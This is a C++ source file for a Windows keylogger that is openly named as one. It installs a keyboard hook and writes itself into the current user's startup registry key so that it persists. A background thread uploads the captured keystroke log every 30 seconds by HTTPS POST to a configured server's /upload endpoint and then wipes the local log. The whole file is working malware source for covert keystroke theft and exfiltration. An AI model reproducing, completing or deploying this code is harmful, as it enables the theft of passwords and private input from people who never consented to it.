#include "hook.h"
#include <cstdio>
#include <string>
#include <wininet.h>
#include <thread>
#include <chrono>
#include "config.h"

#pragma comment(lib, "wininet.lib")

void clearFile(const char *filename)
{
    FILE *fp = fopen(filename, "w");
    if (!fp)
        return;
    fclose(fp);
}

void sendToApi(const std::string &filename)
{
    FILE *file = fopen(filename.c_str(), "rb");
    if (!file)
        return;

    fseek(file, 0, SEEK_END);
    long fileSize = ftell(file);
    rewind(file);

    if (fileSize <= 0)
    {
        fclose(file);
        return;
    }

    std::string fileData(fileSize, '\0');
    size_t readSz = fread(&fileData[0], 1, fileSize, file);
    fclose(file);
    if (readSz != static_cast<size_t>(fileSize))
    {
        return;
    }

    const std::string boundary = "----KeyloggerMultipartFormUploadBoundary";
    std::string body;
    body += "--" + boundary + "\r\n";
    body += "Content-Disposition: form-data; name=\"file\"; filename=\"keylog.txt\"\r\n";
    body += "Content-Type: text/plain\r\n\r\n";
    body += fileData;
    body += "\r\n--" + boundary + "--\r\n";

    std::string contentType = "Content-Type: multipart/form-data; boundary=" + boundary;
    std::wstring wContentType(contentType.begin(), contentType.end());

    HINTERNET hInternet = InternetOpenA("Keylogger", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hInternet)
        return;

    HINTERNET hConnect = InternetConnectA(hInternet, SERVER_HOST, INTERNET_DEFAULT_HTTPS_PORT,
                                          NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect)
    {
        InternetCloseHandle(hInternet);
        return;
    }

    HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", "/upload", NULL,
                                          NULL, NULL,
                                          INTERNET_FLAG_SECURE, 0);
    if (!hRequest)
    {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return;
    }

    std::string headers = contentType + "\r\n";
    headers += "Host: " + std::string(SERVER_HOST) + "\r\n";
    headers += "User-Agent: Keylogger/1.0\r\n";
    headers += "Accept: */*\r\n";

    BOOL sent = HttpSendRequestA(hRequest, headers.c_str(), headers.length(),
                                 (LPVOID)body.c_str(), body.length());
    DWORD err = GetLastError();

    // Check http response
    if (sent)
    {
        DWORD statusCode = 0;
        DWORD size = sizeof(statusCode);
        if (HttpQueryInfo(hRequest, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER,
                          &statusCode, &size, NULL))
        {
            printf("[✓] HTTP response code: %lu\n", statusCode);

            // Get response body for debugging
            char responseBuffer[1024];
            DWORD bytesRead = 0;
            if (InternetReadFile(hRequest, responseBuffer, sizeof(responseBuffer) - 1, &bytesRead))
            {
                responseBuffer[bytesRead] = '\0';
                printf("[DEBUG] Response body: %s\n", responseBuffer);
            }
        }
        else
        {
            printf("[!] Failed to retrieve HTTP response code.\n");
        }
    }
    else
    {
        printf("[!] HttpSendRequest failed. With error %lu\n", err);
    }

    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
}

std::string readFile(const char *filename)
{
    FILE *file = fopen(filename, "rb");
    if (!file)
        return "";

    fseek(file, 0, SEEK_END);
    long fileSize = ftell(file);
    rewind(file);

    if (fileSize <= 0)
    {
        fclose(file);
        return "";
    }

    std::string fileData(fileSize, '\0');
    size_t readSz = fread(&fileData[0], 1, fileSize, file);
    fclose(file);
    if (readSz != static_cast<size_t>(fileSize))
    {
        return "";
    }
    return fileData;
}

void startSendTimer(const char *filename, int intervalSeconds)
{
    while (true)
    {
        std::this_thread::sleep_for(std::chrono::seconds(intervalSeconds));

        std::string data = readFile(filename);
        if (!data.empty())
        {
            sendToApi(filename);
            clearFile(filename);
        }
    }
}

void addToStartup(const char *exeName, const char *exePath)
{
    HKEY hKey = NULL;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, LAUNCH_STARTUP_KEY, 0, KEY_WRITE, &hKey) == ERROR_SUCCESS)
    {
        RegSetValueExA(hKey, exeName, 0, REG_SZ, (const BYTE *)exePath, strlen(exePath) + 1);
        RegCloseKey(hKey);
    }
}

void addToStartupIfNotExists()
{
    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);
    HKEY hKey = NULL;

    if (RegOpenKeyExA(HKEY_CURRENT_USER, LAUNCH_STARTUP_KEY, 0, KEY_READ, &hKey) == ERROR_SUCCESS)
    {
        char value[512];
        DWORD valueLength = sizeof(value);
        LONG result = RegQueryValueExA(hKey, EXE_NAME, NULL, NULL, (LPBYTE)value, &valueLength);
        RegCloseKey(hKey);

        if (result != ERROR_SUCCESS)
        {
            // Add to registry when it doesn't exists
            addToStartup(EXE_NAME, exePath);
        }
    }
    else
    {
        // If we can't open the startup registry, attempt to add anyway
        addToStartup(EXE_NAME, exePath);
    }
}

int main()
{
    if (!installHook())
    {
        return 1;
    }

    addToStartupIfNotExists();

    std::thread senderThread([=]()
                             { startSendTimer(getLogFilePath(), 30); });
    senderThread.detach();

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0))
    {
    }

    uninstallHook();
    return 0;
}
